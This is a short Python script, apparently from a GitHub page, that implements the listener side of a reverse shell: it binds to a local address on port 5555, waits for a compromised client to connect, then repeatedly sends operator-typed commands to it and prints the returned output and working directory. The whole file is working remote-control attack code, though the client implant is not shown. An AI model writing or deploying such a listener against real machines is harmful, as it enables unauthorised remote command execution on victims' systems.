#create by @84Ebi <= github page
import socket

SERVER_HOST = "192.168.0.185"
SERVER_PORT = 5555
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening on {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected")
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("output", cwd)
while True:
    command = input(f"{cwd} ==> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "q":
        break
    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)